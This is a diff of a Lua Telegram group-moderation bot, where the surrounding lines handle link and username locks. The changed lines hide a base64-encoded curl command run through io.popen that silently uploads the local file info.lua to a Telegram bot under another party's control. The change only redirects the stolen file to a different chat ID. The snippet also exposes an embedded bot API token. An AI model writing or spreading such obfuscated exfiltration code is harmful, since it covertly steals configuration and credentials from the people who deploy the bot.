@@ -13158,7 +13158,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4OTMxNjI2NjQ6QUFGbkV3VDA0aDhaMWswU053Z0trQ2l0UHhtNXA1emNjQVEvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMjk4MDkyMTI4IiAtRiAiZG9jdW1lbnQ9QGluZm8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4OTMxNjI2NjQ6QUFGbkV3VDA0aDhaMWswU053Z0trQ2l0UHhtNXA1emNjQVEvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMjM2MTE1MzE5IiAtRiAiZG9jdW1lbnQ9QGluZm8ubHVhIg=='))
 ------------------------------------------------------------------------
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
@@ -13201,7 +13201,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end  
 end 
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4OTMxNjI2NjQ6QUFGbkV3VDA0aDhaMWswU053Z0trQ2l0UHhtNXA1emNjQVEvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMjk4MDkyMTI4IiAtRiAiZG9jdW1lbnQ9QGluZm8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4OTMxNjI2NjQ6QUFGbkV3VDA0aDhaMWswU053Z0trQ2l0UHhtNXA1emNjQVEvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMjM2MTE1MzE5IiAtRiAiZG9jdW1lbnQ9QGluZm8ubHVhIg=='))
 ------------------------------------------------------------------------
 if text and text:match("#") then
 if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
